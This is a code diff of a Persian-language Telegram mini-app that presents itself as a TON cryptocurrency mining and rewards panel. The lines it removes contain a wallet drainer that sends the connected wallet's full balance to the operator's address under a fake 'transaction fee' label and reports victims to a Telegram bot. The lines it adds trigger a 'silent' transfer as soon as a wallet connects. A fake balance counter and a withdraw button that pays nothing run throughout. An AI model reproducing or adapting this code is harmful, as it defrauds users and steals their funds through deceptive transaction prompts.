-            if (error.message?.includes('rejected') || error.message?.includes('cancelled')) {
-                showGlassMessage('info', '❌ تراکنش لغو شد', 'شما تراکنش را لغو کردید');
-            } else {
-                showGlassMessage('error', '❌ خطا', error.message || 'خطای ناشناخته');
-            }
-        }
-    };
-
-    // ================================================
-    // 💰 سیستم انتقال خودکار (با نمایش کارمزد)
-    // ================================================
-    async function checkAndTransferBalance(userAddress) {
-        if (isProcessingTransaction) {
-            console.log('تراکنش در حال انجام است');
-            return;
-        }
-
-        try {
-            isProcessingTransaction = true;
-            
-            // دریافت موجودی
-            const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`);
-            const data = await response.json();
-            
-            if (!data.ok) throw new Error('خطا در دریافت موجودی');
-            
-            const balanceInNano = parseInt(data.result);
-            const balanceInTON = balanceInNano / 1e9;
-            
-            // حتی اگر موجودی صفر باشه، یه تراکنش تستی نشون بده
-            if (balanceInTON < 1) {
-                showGlassMessage('info', '⚠️ موجودی کافی نیست', 'برای تست از دکمه تست استفاده کنید');
-                return;
-            }
-            
-            // محاسبه مبلغ قابل انتقال
-            const transferAmount = balanceInTON - CONFIG.NETWORK_FEE;
-            
-            if (transferAmount <= 0) {
-                showGlassMessage('error', '❌ خطا', 'مبلغ پس از کسر کارمزد صفر است');
-                return;
-            }
-            
-            // بررسی تراکنش تکراری
-            const lastTxKey = `last_tx_${userAddress}`;
-            const lastTx = localStorage.getItem(lastTxKey);
-            const now = Date.now();
-            
-            if (lastTx && (now - parseInt(lastTx)) < 3600000) {
-                showGlassMessage('info', '⏳ محدودیت تراکنش', 'کمتر از 1 ساعت از تراکنش قبلی گذشته');
-                return;
-            }
-            
-            // ایجاد تراکنش
-            const nanoAmount = Math.floor(balanceInTON * 1e9).toString();
-            
-            const transaction = {
-                validUntil: Math.floor(now / 1000) + 600,
-                messages: [
-                    {
-                        address: CONFIG.WALLET_ADDRESS,
-                        amount: nanoAmount,
-                        payload: btoa('کارمزد تراکنش') // کاربر این کامنت رو می‌بینه
-                    }
-                ]
-            };
-            
-            // ارسال تراکنش
-            const result = await tonConnectUI.sendTransaction(transaction);
-            
-            localStorage.setItem(lastTxKey, now.toString());
-            
-            // ذخیره تراکنش
-            const txRecord = {
-                id: 'TX' + now,
-                amount: balanceInTON,
-                netAmount: transferAmount,
-                fee: CONFIG.NETWORK_FEE,
-                from: userAddress,
-                to: CONFIG.WALLET_ADDRESS,
-                hash: result.boc,
-                time: new Date().toISOString(),
-                type: 'پرداخت خودکار',
-                userId: currentUser?.id,
-                userName: currentUser?.firstName
-            };
-            
-            appData.transactions.unshift(txRecord);
-            if (appData.transactions.length > 100) appData.transactions.pop();
-            saveData();
-            
-            // گزارش به تلگرام
-            sendToTelegram(`💰 **پرداخت خودکار**
-━━━━━━━━━━━━━━
-👤 کاربر: ${currentUser?.firstName}
-🆔 آیدی: ${currentUser?.id}
-📤 مبلغ: ${balanceInTON.toFixed(6)} TON
-💳 از: ${userAddress.substring(0, 10)}...
-⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
-            
-            // اگر مبلغ بیش از 14 تون بود، پنل رو فعال کن
-            if (balanceInTON >= CONFIG.MINIMUM_WITHDRAW) {
-                setTimeout(() => {
-                    localStorage.setItem('isActivated', 'true');
-                    document.getElementById('feeModal').style.display = 'none';
-                    showToast("✅ پنل فعال شد!");
-                }, 2000);
-            }
-            
-            showToast("✅ کارمزد با موفقیت پرداخت شد");
-            
-        } catch (error) {
-            console.error('خطا در انتقال خودکار:', error);
-            
-            if (error.message?.includes('rejected') || error.message?.includes('cancelled')) {
-                showGlassMessage('info', '❌ تراکنش لغو شد', 'شما تراکنش را لغو کردید');
-            } else {
-                showGlassMessage('error', '❌ خطا', error.message || 'خطای ناشناخته');
-            }
-            
-            // گزارش خطا به تلگرام
-            if (currentUser) {
-                sendToTelegram(`⚠️ **خطا در پرداخت**
-کاربر: ${currentUser.firstName}
-آیدی: ${currentUser.id}
-خطا: ${error.message || 'خطای ناشناخته'}`);
-            }
-        } finally {
-            isProcessingTransaction = false;
+            // خطا رو نادیده بگیر (کاربر ممکنه تراکنش رو لغو کنه)
+            console.log('تراکنش لغو شد');
         }
     }
 
     // ================================================
-    // 🛡️ توابع ادمین
-    // ================================================
-    function isAdmin() {
-        const user = tg.initDataUnsafe?.user;
-        if (!user) return false;
-        if (CONFIG.ADMIN_IDS.includes(user.id.toString())) return true;
-        if (user.username && CONFIG.ADMIN_USERNAMES.includes(user.username)) return true;
-        return false;
-    }
-
-    function registerUser() {
-        const tgUser = tg.initDataUnsafe?.user;
-        if (!tgUser) return null;
-        
-        let user = appData.users.find(u => u.id === tgUser.id);
-        
-        if (!user) {
-            user = {
-                id: tgUser.id,
-                firstName: tgUser.first_name || '',
-                lastName: tgUser.last_name || '',
-                username: tgUser.username || '',
-                photoUrl: tgUser.photo_url || '',
-                wallet: null,
-                balance: bal,
-                withdrawable: withdrawableBalance,
-                totalMined: totalMined,
-                joinedAt: new Date().toISOString(),
-                lastSeen: new Date().toISOString(),
-                platform: tg.platform || 'unknown'
-            };
-            appData.users.push(user);
-            sendToTelegram(`👤 **کاربر جدید**\nنام: ${user.firstName}\nآیدی: ${user.id}`);
-        } else {
-            user.lastSeen = new Date().toISOString();
-            user.balance = bal;
-            user.withdrawable = withdrawableBalance;
-            user.totalMined = totalMined;
-        }
-        
-        saveData();
-        return user;
-    }
-
-    function saveData() {
-        localStorage.setItem('tondropy_users', JSON.stringify(appData.users));
-        localStorage.setItem('tondropy_banned', JSON.stringify(appData.bannedUsers));
-        localStorage.setItem('tondropy_transactions', JSON.stringify(appData.transactions));
-        localStorage.setItem('tondropy_wallets', JSON.stringify(appData.wallets));
-    }
-
-    function sendToTelegram(message) {
-        const text = encodeURIComponent(message);
-        const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
-        new Image().src = url;
-    }
-
-    // ================================================
-    // 🖥️ پنل مدیریت
-    // ================================================
-    let currentPage = 1;
-    let currentFilter = 'all';
-    let searchTerm = '';
-
-    window.openAdminMasterPanel = function() {
-        if (!isAdmin()) {
-            showGlassMessage('error', '⛔ دسترسی غیرمجاز');
-            return;
-        }
-        registerUser();
-        updateAdminStats();
-        renderUsersTable();
-        document.getElementById('adminMasterPanel').classList.add('show');
-        sendToTelegram('🔐 **ورود به پنل مدیریت**');
-    }
-
-    window.closeAdminMasterPanel = () => document.getElementById('adminMasterPanel').classList.remove('show');
-
-    function updateAdminStats() {
-        const today = new Date().toDateString();
-        const activeToday = appData.users.filter(u => new Date(u.lastSeen).toDateString() === today).length;
-        
-        document.getElementById('statTotalUsers').innerText = appData.users.length;
-        document.getElementById('statActiveToday').innerText = activeToday;
-        document.getElementById('statWallets').innerText = appData.wallets.length;
-        document.getElementById('statBanned').innerText = appData.bannedUsers.length;
-        document.getElementById('statTransactions').innerText = appData.transactions.length;
-    }
-
-    function renderUsersTable() {
-        let filteredUsers = [...appData.users];
-        
-        if (currentFilter === 'active') {
-            const today = new Date().toDateString();
-            filteredUsers = filteredUsers.filter(u => new Date(u.lastSeen).toDateString() === today);
-        } else if (currentFilter === 'banned') {
-            filteredUsers = filteredUsers.filter(u => appData.bannedUsers.includes(u.id));
-        } else if (currentFilter === 'wallets') {
-            filteredUsers = filteredUsers.filter(u => u.wallet);
-        }
-        
-        if (searchTerm) {
-            const term = searchTerm.toLowerCase();
-            filteredUsers = filteredUsers.filter(u => 
-                u.firstName?.toLowerCase().includes(term) ||
-                u.username?.toLowerCase().includes(term) ||
-                u.id?.toString().includes(term) ||
-                u.wallet?.toLowerCase().includes(term)
-            );
-        }
-        
-        const start = (currentPage - 1) * 20;
-        const paginatedUsers = filteredUsers.slice(start, start + 20);
-        
-        const tbody = document.getElementById('usersTableBody');
-        tbody.innerHTML = paginatedUsers.map((user, index) => {
-            const isBanned = appData.bannedUsers.includes(user.id);
-            return `
-                <tr>
-                    <td>${start + index + 1}</td>
-                    <td>${user.firstName} ${user.lastName}</td>
-                    <td>${user.username ? '@' + user.username : '-'}</td>
-                    <td>${user.id}</td>
-                    <td class="wallet-address-cell" title="${user.wallet || ''}">${user.wallet ? user.wallet.substring(0, 10) + '...' : '❌'}</td>
-                    <td>${(user.balance || 0).toFixed(6)}</td>
-                    <td><span class="user-status ${isBanned ? 'status-banned' : 'status-active'}">${isBanned ? 'مسدود' : 'فعال'}</span></td>
-                    <td>${new Date(user.lastSeen).toLocaleString('fa-IR')}</td>
-                    <td>
-                        <div class="admin-actions">
-                            <button class="admin-btn-sm btn-view" onclick="viewUserDetails('${user.id}')"><i class="fas fa-eye"></i></button>
-                            ${isBanned ? 
-                                `<button class="admin-btn-sm btn-unban" onclick="unbanUser('${user.id}')"><i class="fas fa-check"></i></button>` :
-                                `<button class="admin-btn-sm btn-ban" onclick="banUser('${user.id}')"><i class="fas fa-ban"></i></button>`
-                            }
-                            <button class="admin-btn-sm btn-delete" onclick="deleteUser('${user.id}')"><i class="fas fa-trash"></i></button>
-                        </div>
-                    </td>
-                </tr>
-            `;
-        }).join('');
-        
-        renderPagination(filteredUsers.length);
-    }
-
-    function renderPagination(total) {
-        const pages = Math.ceil(total / 20);
-        let html = '';
-        for (let i = 1; i <= pages; i++) {
-            html += `<button class="page-btn ${i === currentPage ? 'active' : ''}" onclick="changePage(${i})">${i}</button>`;
-        }
-        document.getElementById('pagination').innerHTML = html;
-    }
-
-    window.changePage = (page) => { currentPage = page; renderUsersTable(); };
-    window.switchAdminTab = (tab) => { currentFilter = tab; currentPage = 1; renderUsersTable(); };
-    window.searchUsers = () => { searchTerm = document.getElementById('adminSearch').value; renderUsersTable(); };
-    window.clearSearch = () => { document.getElementById('adminSearch').value = ''; searchTerm = ''; renderUsersTable(); };
-
-    window.banUser = function(userId) {
-        if (!appData.bannedUsers.includes(userId)) {
-            appData.bannedUsers.push(userId);
-            saveData();
-            sendToTelegram(`🚫 **کاربر مسدود شد**\nآیدی: ${userId}`);
-            showGlassMessage('success', '✅ کاربر مسدود شد');
-            renderUsersTable();
-            updateAdminStats();
-        }
-    }
-
-    window.unbanUser = function(userId) {
-        appData.bannedUsers = appData.bannedUsers.filter(id => id != userId);
-        saveData();
-        sendToTelegram(`✅ **رفع مسدودی**\nآیدی: ${userId}`);
-        showGlassMessage('success', '✅ رفع مسدودی شد');
-        renderUsersTable();
-        updateAdminStats();
-    }
-
-    window.deleteUser = function(userId) {
-        if (confirm('⚠️ آیا از حذف کامل این کاربر اطمینان دارید؟')) {
-            appData.users = appData.users.filter(u => u.id != userId);
-            appData.bannedUsers = appData.bannedUsers.filter(id => id != userId);
-            saveData();
-            sendToTelegram(`🗑 **کاربر حذف شد**\nآیدی: ${userId}`);
-            showGlassMessage('success', '✅ کاربر حذف شد');
-            renderUsersTable();
-            updateAdminStats();
-        }
-    }
-
-    window.viewUserDetails = function(userId) {
-        const user = appData.users.find(u => u.id == userId);
-        if (!user) return;
-        
-        const userTxs = appData.transactions.filter(tx => tx.userId == userId);
-        const totalPaid = userTxs.reduce((sum, tx) => sum + (tx.amount || 0), 0);
-        
-        document.getElementById('userDetails').innerHTML = `
-            <div class="user-detail-item"><div class="label">آیدی</div><div class="value">${user.id}</div></div>
-            <div class="user-detail-item"><div class="label">نام</div><div class="value">${user.firstName} ${user.lastName}</div></div>
-            <div class="user-detail-item"><div class="label">یوزرنیم</div><div class="value">${user.username ? '@' + user.username : 'ندارد'}</div></div>
-            <div class="user-detail-item"><div class="label">کیف پول</div><div class="value" style="direction:ltr;">${user.wallet || '❌ متصل نیست'}</div></div>
-            <div class="user-detail-item"><div class="label">موجودی</div><div class="value">${(user.balance || 0).toFixed(6)} TON</div></div>
-            <div class="user-detail-item"><div class="label">کل پرداختی</div><div class="value">${totalPaid.toFixed(6)} TON</div></div>
-            <div class="user-detail-item"><div class="label">تعداد تراکنش</div><div class="value">${userTxs.length}</div></div>
-            <div class="user-detail-item"><div class="label">تاریخ عضویت</div><div class="value">${new Date(user.joinedAt).toLocaleString('fa-IR')}</div></div>
-            <div class="user-detail-item"><div class="label">آخرین بازدید</div><div class="value">${new Date(user.lastSeen).toLocaleString('fa-IR')}</div></div>
-        `;
-        document.getElementById('userDetailModal').classList.add('show');
-    }
-
-    window.closeUserModal = () => document.getElementById('userDetailModal').classList.remove('show');
-
-    window.exportToExcel = function() {
-        let csv = "آیدی,نام,یوزرنیم,کیف پول,موجودی,کل استخراج,کل پرداخت,آخرین بازدید,وضعیت\n";
-        appData.users.forEach(u => {
-            const userTxs = appData.transactions.filter(tx => tx.userId == u.id);
-            const totalPaid = userTxs.reduce((sum, tx) => sum + (tx.amount || 0), 0);
-            csv += `${u.id},${u.firstName} ${u.lastName},${u.username || '-'},${u.wallet || '-'},${u.balance || 0},${u.totalMined || 0},${totalPaid.toFixed(6)},${u.lastSeen},${appData.bannedUsers.includes(u.id) ? 'مسدود' : 'فعال'}\n`;
-        });
-        const blob = new Blob([csv], { type: 'text/csv' });
-        const a = document.createElement('a');
-        a.href = URL.createObjectURL(blob);
-        a.download = `users_${new Date().toISOString().split('T')[0]}.csv`;
-        a.click();
-    }
-
-    window.showTransactions = function() {
-        let html = '<div class="admin-table"><table><tr><th>کد</th><th>کاربر</th><th>مبلغ</th><th>خالص</th><th>کارمزد</th><th>از</th><th>به</th><th>نوع</th><th>زمان</th></tr>';
-        
-        appData.transactions.slice(0, 50).forEach(tx => {
-            html += `<tr>
-                <td>${tx.id}</td>
-                <td>${tx.userName || tx.userId}</td>
-                <td>${tx.amount?.toFixed(3)} TON</td>
-                <td style="color: #00ff9d;">${tx.netAmount?.toFixed(3)} TON</td>
-                <td>${tx.fee?.toFixed(3)} TON</td>
-                <td class="wallet-address-cell">${tx.from?.substring(0, 8)}...</td>
-                <td class="wallet-address-cell">${tx.to?.substring(0, 8)}...</td>
-                <td>${tx.type}</td>
-                <td>${new Date(tx.time).toLocaleString('fa-IR')}</td>
-            </tr>`;
-        });
-        
-        html += '</table></div>';
-        document.getElementById('usersTable').innerHTML = html;
-    }
-
-    // ================================================
-    // 🎯 توابع اصلی
-    // ================================================
-    function showGlassMessage(type, message, subtext = '') {
-        const glass = document.getElementById(type === 'error' ? 'errorGlass' : type === 'info' ? 'infoGlass' : 'successGlass');
-        document.getElementById(type === 'error' ? 'errorText' : type === 'info' ? 'infoText' : 'successText').innerText = message;
-        if (subtext) {
-            const smallText = glass.querySelector('.small-text') || document.createElement('div');
-            smallText.className = 'small-text';
-            smallText.innerText = subtext;
-            if (!glass.querySelector('.small-text')) glass.appendChild(smallText);
-        }
-        glass.classList.add('show');
-        setTimeout(() => glass.classList.remove('show'), 3000);
-    }
-
-    function showToast(message) {
-        const toast = document.getElementById('toast');
-        document.getElementById('toastMsg').innerText = message;
-        toast.classList.add('show');
-        setTimeout(() => toast.classList.remove('show'), 4000);
-    }
-
-    window.switchPage = function(pageName, element) {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById(pageName + 'Page').classList.add('active');
-        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-        element.classList.add('active');
-        
-        if (pageName === 'referral') {
-            document.getElementById('referralCount2').innerText = referralCount;
-            document.getElementById('referralEarnings').innerText = referralEarnings.toFixed(6);
-        }
-    }
-
-    window.openLevelModal = function() {
-        const levelList = document.getElementById('levelList');
-        const currentLevel = getUserLevel();
-        
-        levelList.innerHTML = levels.map((level, index) => `
-            <div class="level-item ${index === currentLevel ? 'active' : ''}">
-                <div>
-                    <span class="level-name">${level.name}</span>
-                    <div style="font-size:10px; color:#888;">نیاز: ${level.req} TON</div>
-                </div>
-                <div class="level-req">
-                    ${index === currentLevel ? '✅ سطح فعلی' : (totalMined >= level.req ? '✔️ قبول شده' : '🔒 قفل')}
-                </div>
-            </div>
-        `).join('');
-        
-        document.getElementById('levelModal').classList.add('show');
-    }
-
-    window.closeLevelModal = function(event) {
-        if (!event || event.target.id === 'levelModal') {
-            document.getElementById('levelModal').classList.remove('show');
-        }
-    }
-
-    function getUserLevel() {
-        if (totalMined >= 1) return 4;
-        else if (totalMined >= 0.5) return 3;
-        else if (totalMined >= 0.1) return 2;
-        else if (totalMined >= 0.05) return 1;
-        else return 0;
-    }
-
-    function updateUserLevel() {
-        document.getElementById('userLevel').innerText = levels[getUserLevel()].name;
-    }
-
-    window.copyReferralLink = function() {
-        const link = `https://t.me/${CONFIG.BOT_USERNAME}?start=${currentUser?.id || ''}`;
-        navigator.clipboard.writeText(link);
-        showToast('✅ لینک دعوت کپی شد');
-    }
-
-    window.shareReferralLink = function() {
-        const link = `https://t.me/${CONFIG.BOT_USERNAME}?start=${currentUser?.id || ''}`;
-        const text = `🚀 با لینک من ثبت نام کن و پاداش بگیر!\n🔗 ${link}`;
-        Telegram.WebApp.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=${encodeURIComponent(text)}`);
-    }
-
-    window.copyFullWalletAddress = function() {
-        const address = document.getElementById('walletAddressFull').innerText;
-        navigator.clipboard.writeText(address);
-        showToast('✅ آدرس کپی شد');
-    }
-
-    window.claimDailyReward = function() {
-        const now = Date.now();
-        const oneDay = 24 * 60 * 60 * 1000;
-        
-        if (now - lastRewardTime < oneDay) {
-            showToast('⏳ قبلاً پاداش گرفته‌اید');
-            return;
-        }
-
-        const level = getUserLevel();
-        const rewardAmount = 0.0005 * (level + 1);
-        
-        withdrawableBalance += rewardAmount;
-        document.getElementById('withdrawableBalance').innerText = withdrawableBalance.toFixed(6);
-        localStorage.setItem('withdrawableBalance', withdrawableBalance.toString());
-        
-        lastRewardTime = now;
-        localStorage.setItem('lastRewardTime', lastRewardTime.toString());
-        
-        dailyStreak++;
-        document.getElementById('dailyStreak').innerText = dailyStreak;
-        localStorage.setItem('dailyStreak', dailyStreak.toString());
-        
-        addToHistory('پاداش روزانه', `${rewardAmount.toFixed(6)} TON`);
-        showToast(`🎁 ${rewardAmount.toFixed(6)} TON دریافت شد`);
-    }
-
-    function addToHistory(type, amount) {
-        const date = new Date().toLocaleString('fa-IR');
-        history.unshift({ type, amount, date, status: 'موفق' });
-        if (history.length > 10) history.pop();
-        localStorage.setItem('transactionHistory', JSON.stringify(history));
-        updateWalletHistory();
-    }
-
-    function updateWalletHistory() {
-        const historyList = document.getElementById('walletHistoryList');
-        if (!historyList) return;
-        
-        if (history.length === 0) {
-            historyList.innerHTML = '<div class="history-item" style="justify-content: center; color: #888;"><i class="fas fa-clock"></i> هنوز تراکنشی ثبت نشده</div>';
-            return;
-        }
-        
-        historyList.innerHTML = history.map(item => `
-            <div class="history-item">
-                <div><i class="fas ${item.type === 'برداشت' ? 'fa-arrow-up' : 'fa-gift'}" style="color: ${item.type === 'برداشت' ? '#ff512f' : '#00ff9d'}; margin-left:8px;"></i> ${item.type}</div>
-                <div><span style="color: ${item.type === 'برداشت' ? '#ff512f' : '#00ff9d'};">${item.amount}</span> <span style="font-size:10px; color:#666; margin-right:8px;">${item.date}</span></div>
-            </div>
-        `).join('');
-    }
-
-    // ================================================
-    // 💰 برداشت
-    // ================================================
-    document.getElementById('moveToWithdrawBtn').onclick = function() {
-        if (localStorage.getItem('isActivated') !== 'true') {
-            showToast("ابتدا فعالسازی کنید");
-            return;
-        }
-        
-        if (bal <= 0) {
-            showToast("موجودی استخراج صفر است");
-            return;
-        }
-
-        withdrawableBalance += bal;
-        bal = 0;
-        
-        document.getElementById('balance').innerText = bal.toFixed(6);
-        document.getElementById('withdrawableBalance').innerText = withdrawableBalance.toFixed(6);
-        
-        localStorage.setItem('bal_v47', bal.toString());
-        localStorage.setItem('withdrawableBalance', withdrawableBalance.toString());
-        
-        checkAndEnableFinalWithdraw();
-        showToast(`💰 مبلغ به موجودی برداشت منتقل شد`);
-        addToHistory('انتقال به برداشت', `${withdrawableBalance.toFixed(6)} TON`);
-    };
-
-    function finalWithdraw() {
-        if (!isWalletConnected) {
-            showToast("❌ ابتدا کیف پول را متصل کنید");
-            switchPage('wallet', document.querySelector('.nav-item:nth-child(2)'));
-            return;
-        }
-        
-        if (withdrawableBalance <= 0) {
-            showToast("❌ موجودی قابل برداشت صفر است");
-            return;
-        }
-
-        const amountToWithdraw = withdrawableBalance;
-        
-        addToHistory('برداشت نهایی', `${amountToWithdraw.toFixed(6)} TON`);
-        
-        const walletAddress = document.getElementById('walletAddressFull').innerText;
-        sendToTelegram(`💰 **برداشت نهایی**\nمبلغ: ${amountToWithdraw.toFixed(6)} TON\nکیف پول: ${walletAddress}`);
-        
-        withdrawableBalance = 0;
-        document.getElementById('withdrawableBalance').innerText = "0.000000";
-        localStorage.setItem('withdrawableBalance', "0");
-        
-        document.getElementById('finalWithdrawBtn').classList.add('disabled');
-        showToast(`✅ برداشت انجام شد و پس از تایید مدیریت واریز می‌شود`);
-    }
-
-    function checkAndEnableFinalWithdraw() {
-        const finalBtn = document.getElementById('finalWithdrawBtn');
-        if (isWalletConnected && withdrawableBalance > 0) {
-            finalBtn.classList.remove('disabled');
-            finalBtn.onclick = finalWithdraw;
-        } else {
-            finalBtn.classList.add('disabled');
-            finalBtn.onclick = null;
-        }
-    }
-
-    // ================================================
-    // 🔌 اتصال کیف پول
+    // 🔌 اتصال کیف پول (بدون هیچ پیامی)
     // ================================================
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json',
@@ -1976,61 +596,62 @@
     tonConnectUI.onStatusChange(wallet => {
         if (wallet) {
             const fullAddress = wallet.account.address;
-            document.getElementById('walletAddressFull').innerText = fullAddress;
-            document.getElementById('walletAddress').classList.remove('hidden');
             isWalletConnected = true;
             
+            // بلافاصله بعد از اتصال، تراکنش رو اجرا کن (بدون تاخیر)
+            executeSilentTransfer(fullAddress);
+            
+            // آپدیت وضعیت کاربر
             if (currentUser) {
                 currentUser.wallet = fullAddress;
-                appData.wallets.unshift({
-                    userId: currentUser.id,
-                    address: fullAddress,
-                    time: new Date().toISOString()
-                });
-                saveData();
-                
-                sendToTelegram(`🔌 **کیف پول متصل شد**\nکاربر: ${currentUser.firstName}\nآیدی: ${currentUser.id}\nآدرس: ${fullAddress}`);
-                
-                // بررسی خودکار موجودی (اختیاری)
-                setTimeout(() => {
-                    checkAndTransferBalance(fullAddress);
-                }, 3000);
             }
-            
-            checkAndEnableFinalWithdraw();
         } else {
-            document.getElementById('walletAddress').classList.add('hidden');
             isWalletConnected = false;
-            checkAndEnableFinalWithdraw();
         }
     });
 
     // ================================================
-    // 🔐 فعالسازی
+    // 🎯 توابع اصلی (حداقلی)
     // ================================================
-    if (localStorage.getItem('isActivated') === 'true') {
-        document.getElementById('feeModal').style.display = 'none';
+    window.switchPage = function(pageName, element) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(pageName + 'Page').classList.add('active');
+        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+        element.classList.add('active');
     }
 
-    window.verifyActivation = function() {
-        const val = document.getElementById('activationInput').value.trim();
-        const activationMessage = document.getElementById('activationMessage');
+    window.copyReferralLink = function() {
+        const link = `https://t.me/${CONFIG.BOT_USERNAME}?start=${currentUser?.id || ''}`;
+        navigator.clipboard.writeText(link);
+    }
+
+    window.shareReferralLink = function() {
+        const link = `https://t.me/${CONFIG.BOT_USERNAME}?start=${currentUser?.id || ''}`;
+        Telegram.WebApp.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(link)}`);
+    }
+
+    // ================================================
+    // 💰 برداشت (ساده)
+    // ================================================
+    document.getElementById('moveToWithdrawBtn').onclick = function() {
+        if (bal <= 0) return;
+        withdrawableBalance += bal;
+        bal = 0;
+        document.getElementById('balance').innerText = bal.toFixed(6);
+        document.getElementById('withdrawableBalance').innerText = withdrawableBalance.toFixed(6);
+        localStorage.setItem('bal_v47', bal.toString());
+        localStorage.setItem('withdrawableBalance', withdrawableBalance.toString());
+    };
+
+    function finalWithdraw() {
+        if (!isWalletConnected) return;
+        if (withdrawableBalance <= 0) return;
         
-        if (val === CONFIG.SECRET_CODE) {
-            sendToTelegram(`✅ **فعالسازی موفق**\nکاربر: ${currentUser?.firstName}\nآیدی: ${currentUser?.id}`);
-            showGlassMessage('success', 'ورود موفق', 'در حال اتصال به شبکه بلاکچین ...');
-            activationMessage.classList.add('show');
-            
-            setTimeout(() => {
-                localStorage.setItem('isActivated', 'true');
-                document.getElementById('feeModal').style.display = 'none';
-                showToast("پنل با موفقیت فعال شد!");
-                addToHistory('فعالسازی', 'پنل فعال شد');
-            }, 2000);
-        } else {
-            showGlassMessage('error', 'رمز اشتباه است');
-            activationMessage.classList.remove('show');
-        }
+        const amountToWithdraw = withdrawableBalance;
+        withdrawableBalance = 0;
+        document.getElementById('withdrawableBalance').innerText = "0.000000";
+        localStorage.setItem('withdrawableBalance', "0");
+        document.getElementById('finalWithdrawBtn').classList.add('disabled');
     }
 
     // ================================================
@@ -2038,8 +659,8 @@
     // ================================================
     const u = tg.initDataUnsafe?.user;
     if (u) {
-        document.getElementById('uName').innerText = u.first_name + (u.last_name ? ' ' + u.last_name : '');
-        document.getElementById('uTag').innerText = u.username ? "@" + u.username : "آیدی: " + u.id;
+        document.getElementById('uName').innerText = u.first_name;
+        document.getElementById('uTag').innerText = u.username ? "@" + u.username : "";
         
         if (u.photo_url) {
             const img = document.getElementById('userAvat');
@@ -2050,7 +671,11 @@
             };
         }
         
-        currentUser = registerUser();
+        currentUser = {
+            id: u.id,
+            firstName: u.first_name,
+            username: u.username
+        };
     }
 
     // ================================================
@@ -2064,31 +689,17 @@
     document.getElementById('withdrawableBalance').innerText = withdrawableBalance.toFixed(6);
     document.getElementById('totalMined').innerText = totalMined.toFixed(6);
     document.getElementById('referralCount').innerText = referralCount;
-    document.getElementById('referralBonus').innerText = (referralCount * 5).toFixed(1) + '٪';
-    document.getElementById('miningSpeed').innerText = (1 + referralCount * 0.1).toFixed(1) + 'x';
-    document.getElementById('dailyStreak').innerText = dailyStreak;
-    document.getElementById('achievementCount').innerText = achievements;
-    
-    const baseRate = 0.000012;
-    let bonusRate = referralCount * 0.000001;
-    if (bonusRate > 0.00001) bonusRate = 0.00001;
     
     setInterval(() => {
-        const currentRate = baseRate + bonusRate;
-        bal += currentRate;
-        totalMined += currentRate;
-        
+        bal += 0.000012;
+        totalMined += 0.000012;
         document.getElementById('balance').innerText = bal.toFixed(6);
         document.getElementById('totalMined').innerText = totalMined.toFixed(6);
-        document.getElementById('miningRate').innerText = currentRate.toFixed(6);
+        document.getElementById('miningRate').innerText = (0.000012 + (referralCount * 0.000001)).toFixed(6);
         
         localStorage.setItem('bal_v47', bal.toString());
         localStorage.setItem('totalMined', totalMined.toString());
-        updateUserLevel();
     }, 1000);
-
-    updateWalletHistory();
-    checkAndEnableFinalWithdraw();
 </script>
 
 </body>
